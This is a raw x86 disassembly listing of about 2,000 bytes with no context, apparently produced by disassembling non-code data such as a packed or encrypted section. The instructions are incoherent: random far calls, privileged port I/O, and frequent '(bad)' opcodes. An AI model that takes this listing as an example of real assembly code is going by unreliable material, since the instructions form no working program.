  4069c8:	imul   edx,DWORD PTR [edi],0x8697ab5d
  4069ce:	js     0x406960
  4069d0:	sbb    BYTE PTR [edx],dl
  4069d2:	test   ebx,ebp
  4069d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069d5:	mov    esp,DWORD PTR [edi+0x43ccae36]
  4069db:	out    dx,eax
  4069dc:	neg    DWORD PTR [ebx-0x6e]
  4069df:	mov    ds:0x1ef192a3,al
  4069e4:	retf   0x87c0
  4069e7:	xchg   ecx,eax
  4069e8:	std    
  4069e9:	hlt    
  4069ea:	pop    ecx
  4069eb:	cwde   
  4069ec:	fldenv [esi-0x655059f8]
  4069f2:	retf   
  4069f3:	loopne 0x406a02
  4069f5:	stos   BYTE PTR es:[edi],al
  4069f6:	dec    edi
  4069f7:	sub    esp,DWORD PTR [ebx-0x3800bb13]
  4069fd:	sbb    BYTE PTR [edx],ch
  4069ff:	ins    DWORD PTR es:[edi],dx
  406a00:	xor    cl,BYTE PTR [ebx+0x62a41e21]
  406a06:	add    al,0x99
  406a08:	xor    al,0xbe
  406a0a:	fidiv  DWORD PTR [ebx+0x76]
  406a0d:	mov    bl,0xaa
  406a0f:	jg     0x4069a5
  406a11:	sahf   
  406a12:	test   eax,0x166fc37b
  406a17:	test   BYTE PTR [eax+0x71],bl
  406a1a:	sub    DWORD PTR [ecx],ebp
  406a1c:	dec    esi
  406a1e:	(bad)  
  406a1f:	jge    0x406a3d
  406a21:	xor    BYTE PTR [esi],ch
  406a23:	stos   BYTE PTR es:[edi],al
  406a24:	test   BYTE PTR [esi-0x1c479971],0x3b
  406a2b:	int    0xd0
  406a2d:	ins    BYTE PTR es:[edi],dx
  406a2e:	test   al,0x70
  406a30:	sbb    DWORD PTR [edx-0x23],ebp
  406a33:	push   ebp
  406a34:	mov    dl,0xf7
  406a36:	pop    edi
  406a37:	dec    esi
  406a38:	fild   WORD PTR [ecx]
  406a3a:	sub    ecx,edx
  406a3c:	and    bl,al
  406a3e:	fs retfw 0x4ce3
  406a43:	xchg   DWORD PTR [ecx],edi
  406a45:	xchg   edx,eax
  406a46:	push   es
  406a47:	les    esp,FWORD PTR [bp+si]
  406a4a:	(bad)  
  406a4b:	ds std 
  406a4d:	xor    dh,al
  406a4f:	in     eax,0xc1
  406a51:	pop    edx
  406a52:	bound  edi,QWORD PTR [esi]
  406a54:	mov    eax,0x8d686835
  406a59:	addr16 inc esp
  406a5b:	call   0x55a9:0x3a9b0d4d
  406a62:	jb     0x406ad1
  406a64:	gs clc 
  406a66:	mov    ah,BYTE PTR [ebx+ebp*8-0x39]
  406a6a:	out    0x46,eax
  406a6c:	add    edx,ebp
  406a6e:	das    
  406a6f:	xchg   ebp,eax
  406a70:	cmp    al,bl
  406a72:	repnz add BYTE PTR [edi+0x47],al
  406a76:	and    bh,BYTE PTR [ecx]
  406a78:	sub    bh,BYTE PTR [eax-0x5e]
  406a7b:	outs   dx,DWORD PTR ds:[esi]
  406a7c:	xchg   esp,eax
  406a7d:	leave  
  406a7e:	clc    
  406a7f:	stc    
  406a80:	enter  0x6550,0x50
  406a84:	push   ds
  406a85:	call   0x4bf12063
  406a8a:	ja     0x406aa1
  406a8c:	hlt    
  406a8d:	frstor [ebp-0x5e9c2fc3]
  406a93:	in     eax,0x5d
  406a95:	or     al,0x6c
  406a97:	pop    ss
  406a98:	cmp    ecx,DWORD PTR [esi+0x12]
  406a9b:	adc    eax,0x15670d8e
  406aa0:	call   0x88d16b53
  406aa5:	mov    ah,0x69
  406aa7:	jno    0x406a2f
  406aa9:	fild   WORD PTR [ebx-0x2f]
  406aac:	out    dx,eax
  406aad:	mov    ds:0x68e48cec,al
  406ab2:	sahf   
  406ab3:	mov    dl,BYTE PTR [edi-0x2986cab7]
  406ab9:	jo     0x406b2b
  406abb:	sbb    esp,DWORD PTR [edi-0x17]
  406abe:	cmp    eax,0xeeabc52d
  406ac3:	fsub   DWORD PTR [ecx]
  406ac5:	or     al,0x3f
  406ac7:	sahf   
  406ac8:	call   0x1318acc0
  406acd:	lock and al,BYTE PTR fs:[bx+0x3b]
  406ad3:	inc    eax
  406ad4:	test   dl,dl
  406ad6:	fistp  DWORD PTR [eax+eiz*4]
  406ad9:	ss stos DWORD PTR es:[edi],eax
  406adb:	jae    0x406a6a
  406add:	jo     0x406b34
  406adf:	rol    BYTE PTR [esi+0x777add65],0x3
  406ae6:	or     ecx,ebx
  406ae8:	lds    ecx,FWORD PTR [esp+esi*8+0x24ce1344]
  406aef:	std    
  406af0:	out    0x51,eax
  406af2:	popf   
  406af3:	sub    DWORD PTR ds:0x64b2248c,0x3ed9a354
  406afd:	and    ebx,DWORD PTR ds:0xc8c49c3d
  406b03:	jne    0x406aa7
  406b05:	xor    eax,0x4281cbb7
  406b0a:	xchg   esi,eax
  406b0b:	cld    
  406b0c:	not    DWORD PTR [eax+0x63]
  406b0f:	dec    edx
  406b10:	test   DWORD PTR [ebx],0x43e2e814
  406b16:	jl     0x406b6c
  406b18:	inc    edx
  406b19:	lods   eax,DWORD PTR ds:[esi]
  406b1a:	xchg   esp,eax
  406b1b:	or     eax,0xdaa9b1ba
  406b20:	jle    0x406ab4
  406b22:	loop   0x406b72
  406b24:	jge    0x406b9b
  406b26:	sbb    eax,0x17d1780f
  406b2b:	mov    ?,WORD PTR ds:0x803a60b3
  406b31:	xchg   BYTE PTR [eax+0x687e6e6b],bh
  406b37:	push   ecx
  406b38:	pop    ebx
  406b39:	sbb    ecx,DWORD PTR [edi]
  406b3b:	adc    esi,eax
  406b3d:	xchg   ebp,eax
  406b3e:	loopne 0x406b84
  406b40:	push   es
  406b41:	fst    QWORD PTR [ebx-0x76b45aa5]
  406b47:	into   
  406b48:	out    dx,al
  406b49:	(bad)  
  406b4a:	std    
  406b4b:	aam    0xa6
  406b4d:	jae    0x406b1c
  406b4f:	mul    DWORD PTR [edx+0x7e]
  406b52:	ins    BYTE PTR es:[edi],dx
  406b53:	ret    0xdb49
  406b56:	mov    bh,0xe1
  406b58:	jns    0x406af2
  406b5a:	dec    eax
  406b5b:	push   0xe0b34e20
  406b60:	aad    0xe
  406b62:	jl     0x406ae9
  406b64:	sahf   
  406b65:	mov    ch,0x1b
  406b67:	aad    0x6e
  406b69:	sub    al,0x1d
  406b6b:	pop    es
  406b6c:	jb     0x406b02
  406b6e:	repnz out dx,al
  406b70:	fild   DWORD PTR [edi-0x3d31ec8d]
  406b76:	ins    DWORD PTR es:[edi],dx
  406b77:	or     edx,esi
  406b79:	rcl    BYTE PTR [ebx+eax*8+0x5f],cl
  406b7d:	sti    
  406b7e:	cwde   
  406b7f:	leave  
  406b80:	fcomp  DWORD PTR [edi+0x1e]
  406b83:	jns    0x406b8a
  406b85:	rol    bl,0x91
  406b88:	call   0x8105:0x4d60ea1f
  406b8f:	add    al,0x7f
  406b91:	jb     0x406b78
  406b93:	xchg   DWORD PTR [eax],eax
  406b95:	sub    eax,0xa0643769
  406b9a:	or     al,0x1
  406b9c:	jl     0x406ba9
  406b9e:	sub    al,0x7
  406ba0:	mov    ch,0x7a
  406ba2:	mov    dh,0x4
  406ba4:	push   ebp
  406ba5:	xchg   ecx,eax
  406ba6:	sub    ebx,DWORD PTR [edi-0x19d53449]
  406bac:	enter  0xfa77,0xa8
  406bb0:	int3   
  406bb1:	sbb    bl,BYTE PTR [eax]
  406bb3:	fldenv [bx+si+0x71]
  406bb7:	fisttp WORD PTR [eax-0x59]
  406bba:	pop    esp
  406bbb:	mov    al,ds:0x6c899205
  406bc0:	sbb    ebp,DWORD PTR [edi+0x335a080d]
  406bc6:	mov    al,ds:0x3eb9b45
  406bcb:	adc    DWORD PTR [eax+0x7],ebx
  406bce:	inc    eax
  406bcf:	clc    
  406bd0:	mov    ds:0xeb895c2a,al
  406bd5:	ja     0x406bd1
  406bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd8:	mov    ebp,0x212b5657
  406bdd:	jmp    0x26b8:0xaf167c75
  406be4:	or     BYTE PTR [esi-0x7e],cl
  406be7:	(bad)  
  406be8:	jno    0x406c42
  406bea:	aas    
  406beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bec:	pop    ecx
  406bed:	jo     0x406c4f
  406bef:	push   es
  406bf0:	mov    ch,0xaa
  406bf2:	ja     0x406c64
  406bf4:	in     eax,dx
  406bf5:	push   0x452a3957
  406bfa:	xor    bl,BYTE PTR [eax+edx*1+0x32]
  406bfe:	dec    ebp
  406bff:	mov    eax,0xc8cd1eed
  406c04:	cmp    bl,bl
  406c06:	std    
  406c07:	loopne 0x406c5f
  406c09:	outs   dx,DWORD PTR ds:[esi]
  406c0a:	mov    eax,ds:0xacd33ca4
  406c0f:	cs fcomp st(5)
  406c12:	outs   dx,DWORD PTR ds:[esi]
  406c13:	sahf   
  406c14:	xchg   al,cl
  406c16:	push   cs
  406c17:	lock ss into 
  406c1a:	stos   BYTE PTR es:[edi],al
  406c1b:	cmp    DWORD PTR [edx-0x76],ebx
  406c1e:	stos   DWORD PTR es:[edi],eax
  406c1f:	and    esi,ebp
  406c21:	mov    eax,0x7d81ce69
  406c26:	sub    BYTE PTR [ecx-0x5777fc29],bh
  406c2c:	retf   0x2d4
  406c2f:	xor    edx,DWORD PTR [ecx-0x4a]
  406c32:	std    
  406c33:	and    DWORD PTR [edi],esi
  406c35:	ins    BYTE PTR es:[edi],dx
  406c36:	mov    ebp,0x8aff6f82
  406c3b:	loope  0x406c6b
  406c3d:	adc    al,0x34
  406c3f:	push   ebx
  406c40:	and    BYTE PTR [edi+0x29],ah
  406c43:	in     eax,0x77
  406c45:	int3   
  406c46:	push   es
  406c47:	xor    edx,DWORD PTR [esi+0x59]
  406c4a:	mov    al,0xed
  406c4c:	sti    
  406c4d:	js     0x406c60
  406c4f:	inc    esi
  406c50:	xchg   esp,eax
  406c51:	fcomp  DWORD PTR [edx+edx*4-0x37]
  406c55:	icebp  
  406c56:	mov    bl,0x71
  406c58:	dec    ecx
  406c59:	and    BYTE PTR [ecx+0x1d],ch
  406c5c:	pop    ds
  406c5d:	std    
  406c5e:	bound  edx,QWORD PTR [edx]
  406c60:	xor    bh,BYTE PTR [edx-0x7ee513a5]
  406c66:	sbb    ecx,DWORD PTR [ecx+0xc]
  406c69:	pop    esp
  406c6a:	and    DWORD PTR [esi],esi
  406c6c:	xor    dh,BYTE PTR [ebp+0x49b9fb32]
  406c72:	rcr    DWORD PTR [esp+eiz*8],0x3
  406c76:	dec    ecx
  406c77:	aad    0xf5
  406c79:	cmp    al,0x57
  406c7b:	mov    ebx,0x5657ad35
  406c80:	mov    bl,0x7d
  406c82:	ins    BYTE PTR es:[edi],dx
  406c83:	xor    ah,BYTE PTR [ebx+0x9]
  406c86:	or     ecx,DWORD PTR [edx]
  406c88:	xchg   edi,eax
  406c89:	enter  0xc5e,0xb5
  406c8d:	outs   dx,DWORD PTR ds:[esi]
  406c8e:	push   edi
  406c8f:	mov    esi,0x83931e9a
  406c94:	arpl   WORD PTR [edx-0x354c8521],dx
  406c9a:	repz or DWORD PTR [ebx],0x697df8a
  406ca1:	mov    ch,BYTE PTR [edx-0x7797a4fa]
  406ca7:	cmp    DWORD PTR [edi],esi
  406ca9:	dec    eax
  406caa:	sub    ecx,DWORD PTR [eax-0x6b568503]
  406cb0:	mov    dl,0x9f
  406cb2:	push   edx
  406cb3:	stos   DWORD PTR es:[edi],eax
  406cb4:	jns    0x406c56
  406cb6:	mov    esp,0x3f2c3bfb
  406cbb:	push   ecx
  406cbc:	jne    0x406cc8
  406cbe:	ret    
  406cbf:	xor    eax,0x25a9e4b0
  406cc4:	loop   0x406c4b
  406cc6:	clc    
  406cc7:	push   edi
  406cc8:	cmp    eax,0x1683ba80
  406ccd:	sbb    al,0xcf
  406ccf:	xor    cl,ch
  406cd1:	xchg   ebp,eax
  406cd2:	xor    al,0x3c
  406cd4:	xor    eax,ebp
  406cd6:	jno    0x406ca7
  406cd8:	mov    edx,DWORD PTR [ebx+0x9560868]
  406cde:	loopne 0x406c8d
  406ce0:	imul   esi,DWORD PTR [eax+0xe],0x5fec07dd
  406ce7:	lods   eax,DWORD PTR ds:[esi]
  406ce8:	addr16 inc edi
  406cea:	test   eax,0x810d0948
  406cef:	lods   al,BYTE PTR ds:[esi]
  406cf0:	pop    es
  406cf1:	xor    edx,DWORD PTR [eax+0x17a9bde4]
  406cf7:	cwde   
  406cf8:	xchg   edx,eax
  406cf9:	fadd   DWORD PTR [esp]
  406cfd:	stos   BYTE PTR es:[edi],al
  406cfe:	add    DWORD PTR [esi],0x84848717
  406d04:	inc    esi
  406d05:	pop    edi
  406d06:	lahf   
  406d07:	lods   al,BYTE PTR ds:[esi]
  406d08:	(bad)  
  406d09:	rol    esi,0xc0
  406d0c:	sbb    eax,0x3a5327e5
  406d11:	(bad)  
  406d12:	call   0x97073a2b
  406d17:	pop    ebp
  406d18:	stos   BYTE PTR es:[edi],al
  406d19:	bound  ecx,QWORD PTR [ecx]
  406d1b:	add    ah,ah
  406d1d:	js     0x406c9f
  406d1f:	test   BYTE PTR [ebp+0xb],bl
  406d22:	lock or BYTE PTR [ecx+ecx*2+0x797fd193],bl
  406d2a:	ss nop
  406d2c:	sbb    bl,BYTE PTR [eax+0x4abdd415]
  406d32:	jnp    0x406d0d
  406d34:	loope  0x406cb6
  406d36:	(bad)  
  406d38:	ror    DWORD PTR ds:0x9436e6d7,0x5f
  406d3f:	mov    esp,fs
  406d41:	loope  0x406d14
  406d43:	dec    ebp
  406d44:	jge    0x406d17
  406d46:	push   ebx
  406d47:	jns    0x406da9
  406d49:	fs retf 0xb530
  406d4d:	push   ss
  406d4e:	int3   
  406d4f:	mov    ch,0x87
  406d51:	mov    edx,0x8f16a4b9
  406d56:	imul   edi,DWORD PTR [ebp-0x57],0xffffff9f
  406d5a:	rcr    BYTE PTR [ebp+0x66],1
  406d5d:	pop    es
  406d5e:	fs jp  0x406d5e
  406d61:	xor    al,0xea
  406d63:	mov    ?,WORD PTR [esp+eax*8-0x1d]
  406d67:	xchg   edx,edi
  406d69:	loope  0x406d14
  406d6b:	ret    
  406d6c:	jnp    0x406dd7
  406d6e:	add    edi,DWORD PTR [eax]
  406d70:	jmp    0x406da1
  406d72:	push   ss
  406d73:	repz gs adc BYTE PTR ss:[edx],dl
  406d78:	xlat   BYTE PTR ds:[ebx]
  406d79:	xchg   ebp,eax
  406d7a:	xchg   edx,eax
  406d7b:	sahf   
  406d7c:	mov    WORD PTR [ebx+0x4a],es
  406d7f:	jbe    0x406dd7
  406d81:	out    0x94,al
  406d83:	xor    eax,0xf22915aa
  406d88:	jge    0x406d1f
  406d8a:	cmc    
  406d8b:	call   0xf8682c19
  406d90:	in     al,dx
  406d91:	push   0x8acd7e8b
  406d96:	adc    al,0x4
  406d98:	outs   dx,DWORD PTR ds:[esi]
  406d99:	imul   esp,DWORD PTR [ebp-0x761abad6],0xffffffef
  406da0:	jns    0x406de8
  406da2:	push   0x9019fb3f
  406da7:	mov    esi,0x872d54a9
  406dac:	mov    ebx,0xa8a31ca4
  406db1:	mov    dl,0xeb
  406db3:	cli    
  406db4:	icebp  
  406db5:	dec    esp
  406db6:	fistp  DWORD PTR [ebp-0x71]
  406db9:	lea    esp,[eax+0x0]
  406dbc:	dec    edx
  406dbd:	mov    bl,ah
  406dbf:	rsqrtps xmm6,XMMWORD PTR es:[ecx+0x28]
  406dc4:	mov    ds:0x3273643c,eax
  406dc9:	adc    bl,0xb
  406dcc:	mov    ebp,0x10bd130
  406dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd2:	add    BYTE PTR [eax+0x4549e4fa],ch
  406dd8:	sub    ecx,ebx
  406dda:	adc    ah,BYTE PTR [ecx-0x1e]
  406ddd:	iret   
  406dde:	es dec ebp
  406de0:	jb     0x406de2
  406de2:	push   edx
  406de3:	inc    ebp
  406de4:	outs   dx,DWORD PTR ds:[esi]
  406de5:	xor    al,0x2c
  406de7:	fld    TBYTE PTR [edx]
  406de9:	dec    ecx
  406dea:	mov    ah,0xaa
  406dec:	mov    esi,0x53d6bd4c
  406df1:	in     al,0xab
  406df3:	sub    dh,bh
  406df5:	adc    edx,ebx
  406df7:	call   DWORD PTR [edx]
  406df9:	or     al,0x6f
  406dfb:	ds inc esi
  406dfd:	mov    ah,BYTE PTR [esi+0x4f5c6d08]
  406e03:	push   ss
  406e04:	sbb    ebp,DWORD PTR [ecx]
  406e06:	pop    edx
  406e07:	loope  0x406e51
  406e09:	fwait
  406e0a:	in     eax,dx
  406e0b:	mov    ebx,0x11add573
  406e10:	mov    dl,0x35
  406e12:	jno    0x406dd0
  406e14:	cwde   
  406e15:	sti    
  406e16:	mov    BYTE PTR [eax+0x1ffc71c9],al
  406e1c:	gs inc eax
  406e1e:	retf   
  406e1f:	lods   eax,DWORD PTR ds:[esi]
  406e20:	pop    ebp
  406e21:	jle    0x406e7a
  406e23:	mov    esi,ecx
  406e25:	xchg   ebx,eax
  406e26:	data16 stos BYTE PTR es:[edi],al
  406e28:	arpl   si,di
  406e2a:	adc    al,0x92
  406e2c:	aad    0x30
  406e2e:	or     al,dh
  406e30:	sbb    DWORD PTR [edx+ebp*1-0x76946bcc],esp
  406e37:	ja     0x406dd3
  406e39:	cmp    DWORD PTR [esi+0x4b55d56e],edi
  406e3f:	add    BYTE PTR [ebx+0x7c],ah
  406e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e43:	ds jnp 0x406dd4
  406e46:	jns    0x406e5e
  406e48:	pop    edi
  406e49:	test   eax,0x4cbdb36
  406e4e:	pop    ss
  406e4f:	adc    cl,BYTE PTR [esi]
  406e51:	sub    al,0x19
  406e53:	icebp  
  406e54:	ds stos DWORD PTR es:[edi],eax
  406e56:	pushf  
  406e57:	xchg   esi,eax
  406e58:	dec    ebx
  406e59:	adc    ch,BYTE PTR ds:0xc8a7407e
  406e60:	sub    BYTE PTR [ecx-0x76],0x9f
  406e64:	pushf  
  406e65:	jns    0x406eda
  406e67:	sahf   
  406e68:	(bad)  
  406e69:	or     al,0xa3
  406e6b:	xchg   edi,eax
  406e6c:	fisttp QWORD PTR [edi]
  406e6e:	jnp    0x406df7
  406e70:	and    ebp,DWORD PTR [ebx+0x1339469d]
  406e76:	fisttp WORD PTR [ecx-0x2a]
  406e7a:	cmp    bl,BYTE PTR [ebx-0x790380e1]
  406e80:	adc    eax,0x1fb99a83
  406e85:	call   0x4caa8c63
  406e8a:	inc    ebp
  406e8b:	jecxz  0x406e12
  406e8d:	pop    ss
  406e8e:	or     bh,al
  406e90:	aam    0x70
  406e92:	dec    esi
  406e93:	ins    DWORD PTR es:[edi],dx
  406e94:	in     eax,0x84
  406e96:	stos   DWORD PTR es:[edi],eax
  406e97:	inc    edx
  406e98:	and    DWORD PTR [edx-0x38],ebp
  406e9b:	repnz fiadd DWORD PTR ds:0x89193738
  406ea2:	push   ebp
  406ea3:	clc    
  406ea4:	in     eax,dx
  406ea5:	push   ebp
  406ea6:	leave  
  406ea7:	jg     0x406f17
  406ea9:	lahf   
  406eaa:	cld    
  406eab:	ror    edx,cl
  406ead:	adc    bh,BYTE PTR [esi]
  406eaf:	ja     0x406eb1
  406eb1:	cmp    BYTE PTR [ebp+0x787d5958],bl
  406eb7:	jg     0xce04d2d9
  406ebd:	mov    dh,0xc4
  406ebf:	test   eax,0x5f70679d
  406ec4:	popf   
  406ec5:	push   ecx
  406ec6:	std    
  406ec7:	and    al,0x85
  406ec9:	into   
  406eca:	xor    al,0xbe
  406ecc:	adc    al,0x7f
  406ece:	imul   ecx,DWORD PTR [ebp-0x4810b93a],0xffffff85
  406ed5:	mov    eax,0x61cc23a6
  406eda:	pop    edx
  406edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406edc:	mov    al,ds:0xf520b66e
  406ee1:	jns    0x406edd
  406ee3:	sti    
  406ee4:	cmp    eax,0xe149b0ca
  406ee9:	cs pop ebx
  406eeb:	out    dx,al
  406eec:	outs   dx,BYTE PTR ds:[esi]
  406eed:	shr    ebp,1
  406eef:	sbb    DWORD PTR [edi-0x3e5e814e],ecx
  406ef5:	cmp    ebx,DWORD PTR [esi-0x8986565]
  406efb:	rcl    ch,cl
  406efd:	or     esi,DWORD PTR [edx+0x2d256867]
  406f03:	mov    esi,0x68fc0804
  406f08:	cmp    al,0xfd
  406f0a:	pop    edx
  406f0b:	push   eax
  406f0c:	arpl   dx,si
  406f0e:	pusha  
  406f0f:	xor    esi,DWORD PTR [esi-0x4d]
  406f12:	sub    eax,0x3da8ded5
  406f17:	imul   edi,ebx,0x36
  406f1a:	cmp    BYTE PTR [ecx],0x84
  406f1d:	lahf   
  406f1e:	cld    
  406f1f:	add    BYTE PTR [ebx-0x1f],bl
  406f22:	push   edx
  406f23:	(bad)  
  406f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f25:	dec    esp
  406f26:	adc    BYTE PTR [edi+0x5e44b0db],cl
  406f2c:	or     BYTE PTR [ecx+eax*8],0xb7
  406f30:	adc    al,0xc7
  406f32:	dec    eax
  406f33:	add    bh,BYTE PTR ds:0x3b54b15a
  406f39:	mov    ds:0xef5de7ab,al
  406f3e:	sbb    BYTE PTR [edi+esi*1+0x26],0xb1
  406f43:	dec    edi
  406f44:	adc    BYTE PTR [edi],ch
  406f46:	add    eax,0x497229f0
  406f4b:	sub    DWORD PTR [ebx+0x47],ebp
  406f4e:	cs clc 
  406f50:	cs out dx,eax
  406f52:	jb     0x406f7d
  406f54:	sbb    eax,0xa5651a6
  406f59:	jp     0x406ee2
  406f5b:	fidivr DWORD PTR [ecx-0x38d59499]
  406f61:	cmp    al,0xb1
  406f63:	or     eax,0x90928cca
  406f68:	push   es
  406f69:	mov    esp,0x6c1f8473
  406f6e:	scas   eax,DWORD PTR es:[edi]
  406f6f:	mov    ebp,0x73a7881c
  406f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f75:	and    eax,0x6abbe1af
  406f7a:	out    0x7e,al
  406f7c:	or     bh,bh
  406f7e:	adc    cl,BYTE PTR [ebp-0x3e73c0ff]
  406f84:	div    DWORD PTR [ecx-0x89b44da]
  406f8a:	pop    ecx
  406f8b:	or     cl,bl
  406f8d:	cld    
  406f8e:	adc    eax,0x5cd00934
  406f93:	daa    
  406f94:	inc    esi
  406f95:	fistp  WORD PTR [edx+0xb]
  406f98:	xor    al,0x35
  406f9a:	push   es
  406f9b:	dec    ebx
  406f9c:	data16 xor ah,dh
  406f9f:	sbb    al,0x73
  406fa1:	sbb    edx,ebx
  406fa3:	fcomp  DWORD PTR [ebp-0x3]
  406fa6:	mov    esp,0x36b75824
  406fab:	jl     0x407020
  406fad:	mov    ds:0xaf037235,al
  406fb2:	adc    DWORD PTR [ebx-0x23625dd2],ebx
  406fb8:	punpckldq mm5,DWORD PTR [ecx+0x5b]
  406fbc:	add    eax,0x55b39c38
  406fc1:	test   DWORD PTR [ecx],0x5cf78eb6
  406fc7:	and    bh,BYTE PTR [eax+0x7e]
  406fca:	xchg   ebp,eax
  406fcb:	arpl   WORD PTR [ebp+0x3e],dx
  406fce:	adc    eax,0xe92febf3
  406fd3:	mov    ds:0xebda16de,eax
  406fd8:	out    0x57,al
  406fda:	adc    al,0x65
  406fdc:	mov    cl,0x30
  406fde:	test   eax,0x629dfd8d
  406fe3:	jge    0x406f73
  406fe5:	pop    esp
  406fe6:	bound  ebx,QWORD PTR [esi+0x43]
  406fe9:	mov    edx,0xc3dc4554
  406fee:	inc    edx
  406fef:	or     edi,DWORD PTR [ebp-0x4b124b2]
  406ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ff6:	adc    esp,DWORD PTR [eax-0x77]
  406ff9:	not    al
  406ffb:	mov    esp,0x2478ef6c
  407000:	xchg   esp,eax
  407001:	ins    BYTE PTR es:[edi],dx
  407002:	mov    ds:0x9a7da2c7,eax
  407007:	jnp    0x407027
  407009:	clc    
  40700a:	pop    ss
  40700b:	shr    BYTE PTR [edx+0x70d80f56],1
  407011:	mov    bl,BYTE PTR [esi]
  407013:	out    0x88,eax
  407015:	outs   dx,BYTE PTR ds:[esi]
  407016:	add    eax,0xa08c09c1
  40701b:	(bad)  
  40701c:	addr16 inc ecx
  40701e:	mov    bl,0x96
  407020:	sbb    al,0x5b
  407022:	sar    BYTE PTR fs:[edi-0x24],cl
  407026:	mov    dh,0x95
  407028:	lahf   
  407029:	cwde   
  40702a:	js     0x407004
  40702c:	pop    eax
  40702d:	and    BYTE PTR [ecx+0x31],dl
  407030:	loope  0x406fed
  407032:	mov    ds:0x4919cb5c,eax
  407037:	mov    eax,0x2fd276b1
  40703c:	xlat   BYTE PTR ds:[ebx]
  40703d:	or     esi,ebx
  40703f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407041:	push   edx
  407042:	lahf   
  407043:	sub    eax,0xc8eff26c
  407048:	and    BYTE PTR [bp+si],ch
  40704b:	sbb    dh,cl
  40704d:	imul   esp,DWORD PTR [ecx+0x75],0x6c9e1db6
  407054:	(bad)  
  407056:	fcomp  QWORD PTR [ecx+0x3]
  407059:	in     eax,dx
  40705a:	or     eax,0xa8c1fd67
  40705f:	dec    edx
  407060:	sub    BYTE PTR [ebx],ch
  407062:	xchg   esi,eax
  407063:	cdq    
  407064:	adc    DWORD PTR [ecx+0x35],esi
  407067:	add    eax,ebp
  407069:	int3   
  40706a:	and    al,ch
  40706c:	xchg   esi,eax
  40706d:	fbld   TBYTE PTR [ebx+0x232eea]
  407073:	arpl   WORD PTR [ebp-0x5c],bp
  407076:	dec    eax
  407077:	pushf  
  407078:	ins    DWORD PTR es:[edi],dx
  407079:	outs   dx,DWORD PTR ds:[esi]
  40707a:	fld    QWORD PTR [edx]
  40707c:	std    
  40707d:	out    dx,eax
  40707e:	ret    
  40707f:	lods   eax,DWORD PTR ds:[esi]
  407080:	ret    0x3ed5
  407083:	mov    BYTE PTR [esi],0xc9
  407086:	stos   DWORD PTR es:[edi],eax
  407087:	cs fdiv st(2),st
  40708a:	mov    dl,0x1b
  40708c:	xchg   ecx,eax
  40708d:	inc    eax
  40708e:	sub    BYTE PTR [ecx],cl
  407090:	or     dh,bh
  407092:	or     BYTE PTR [edx-0x723d7af7],cl
  407098:	xor    edx,esi
  40709a:	jg     0x4070fd
  40709c:	rcl    DWORD PTR [edi+0x71],cl
  40709f:	adc    dh,bl
  4070a1:	outs   dx,BYTE PTR ds:[esi]
  4070a2:	pop    ds
  4070a3:	(bad)  
  4070a4:	popf   
  4070a5:	popa   
  4070a6:	pop    ds
  4070a7:	and    al,0x98
  4070a9:	pop    ebx
  4070aa:	je     0x407120
  4070ac:	mov    BYTE PTR [ebx-0x69784416],cl
  4070b2:	jbe    0x407080
  4070b4:	mov    edi,DWORD PTR [esi+0x549cd7cc]
  4070ba:	pop    edx
  4070bb:	jnp    0x407136
  4070bd:	out    0x39,al
  4070bf:	mov    ebx,0x80436d3d
  4070c4:	xor    BYTE PTR [esp+ebx*1+0x7fef8bcc],cl
  4070cb:	mov    ebp,0x9d3963a6
  4070d0:	in     al,0x5e
  4070d2:	or     al,BYTE PTR [ebp-0x4c]
  4070d5:	ds pop ds
  4070d7:	pop    ecx
  4070d8:	mov    esi,0xf581c30e
  4070dd:	fist   DWORD PTR [edx]
  4070df:	adc    eax,0x8c23bf35
  4070e4:	ja     0x4070cc
  4070e6:	mov    dl,0xf4
  4070e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070e9:	xor    ecx,DWORD PTR [ecx+0x3cd4ceb]
  4070ef:	fidivr DWORD PTR [esi-0x4d]
  4070f2:	(bad)  
  4070f3:	pop    esi
  4070f4:	jno    0x407160
  4070f6:	push   es
  4070f7:	mov    al,ds:0x8c895dce
  4070fc:	or     ebx,DWORD PTR [edi+ecx*8-0x54b080ff]
  407103:	jno    0x40709c
  407105:	dec    esp
  407106:	(bad)  
  407107:	pop    es
  407108:	icebp  
  407109:	fst    QWORD PTR [edx]
  40710b:	in     eax,0x66
  40710d:	adc    edi,ebp
  40710f:	cmp    eax,0x121a3ee5
  407114:	fsub   st,st(1)
  407116:	adc    ecx,DWORD PTR [ebx+0x1d2fb2ab]
  40711c:	pop    edx
  40711d:	mov    bh,0x9f
  40711f:	imul   eax,ecx,0x3dd9b4e9
  407125:	rcl    bh,1
  407127:	jmp    0x300c:0x71de1c62
  40712e:	cmp    eax,0x99f7da60
  407133:	and    DWORD PTR [edi],ebp
  407135:	and    edx,DWORD PTR [eax+0x2a25b75d]
  40713b:	hlt    
  40713c:	daa    
  40713d:	test   eax,0x3f18de49
  407142:	shl    BYTE PTR [eax-0x6568bf02],1
  407148:	xchg   esi,eax
  407149:	mov    WORD PTR [edx-0x2915b2c3],?
  40714f:	rcr    DWORD PTR [edi+0x1b],cl
  407152:	fld    TBYTE PTR [esi+0x7944111d]
  407158:	or     eax,0x576e85ae
  40715d:	or     DWORD PTR [esi-0x696db9fc],0x5e
  407164:	cmp    al,BYTE PTR [ebx+eax*1+0x54]
  407168:	lods   al,BYTE PTR ds:[esi]
  407169:	lds    edi,FWORD PTR [ebx]
  40716b:	inc    eax
  40716c:	push   0x92f4ff1f
  407171:	test   DWORD PTR [esi-0xa],ebx
  407174:	inc    esp
  407175:	add    al,BYTE PTR [esi-0xb04d963]
  40717b:	js     0x407126
  40717d:	or     al,0xd1
  40717f:	push   cs
  407180:	scas   al,BYTE PTR es:[edi]
  407181:	push   cs
  407182:	int3   
  407183:	(bad)  
  407184:	out    0x46,eax
  407186:	cld    
  407187:	fidiv  DWORD PTR [ecx]
